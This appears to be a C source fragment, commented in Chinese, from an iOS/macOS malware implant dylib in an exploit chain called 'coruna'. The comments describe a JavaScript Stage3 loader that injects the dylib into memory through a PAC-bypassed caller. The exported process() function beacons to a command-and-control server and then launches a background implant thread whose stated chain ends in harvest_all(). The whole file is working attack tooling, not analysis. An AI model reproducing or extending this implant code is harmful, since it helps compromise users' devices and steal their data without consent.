/*
 * Stage3_VariantB.js（Go 仓库内 PATCH）同步拉取 code.dylib 后，会解析 LC_SYMTAB，
 * 查找名为 "_process" 的导出符号，找不到则抛错 → C2 侧看到 coruna chain error。
 *
 * Stage3 使用的是手动 Mach-O 内存注入（不是 dlopen），因此
 * __attribute__((constructor)) 不会自动触发。
 * process() 必须是真正的入口点，负责启动后台植入线程。
 *
 * 执行顺序：
 *   Stage3 调用 _process (PAC-bypassed caller)
 *   → process() → coruna_constructor() → 后台线程 → implant_main()
 *   → ke_run() / hook_slot 等待 → harvest_all()
 */

/* coruna_constructor / upload_beacon 定义在其他翻译单元，extern 跨 TU 调用 */
extern void coruna_constructor(void);
extern void upload_beacon(void);

/* ── dylib 主入口（由 Stage3 直接调用）────────────────────────────────────── */
/*
 * Stage3_VariantB.js 通过 PAC-bypassed caller 跳转到此符号。
 * 必须保持 default visibility，否则被 -fvisibility=hidden 剔出导出表，
 * Stage3 无法在 LC_SYMTAB 中找到 _process → 抛错 → 链失败。
 *
 * 执行顺序：
 *   1. upload_beacon()      — 同步探针（5s 超时）。
 *                             在 Stage3 调用线程中运行，进程此时肯定存活。
 *                             服务端日志能看到此记录 → Foundation/NSURLSession 正常。
 *                             看不到此记录 → ObjC 层以下就崩了或网络完全不通。
 *   2. coruna_constructor() — 启动后台 implant 线程（dispatch_once 保证单次）。
 *
 * upload_beacon() 最多阻塞 5 秒，不影响链成功率：
 * Stage3 仅等待 _process 返回，没有短路定时器。
 */
__attribute__((visibility("default")))
void process(void) {
    upload_beacon();      /* 诊断层 1：同步上报，确认 C2 可达 */
    coruna_constructor(); /* 诊断层 2：线程启动后第一行也会上报 */
}
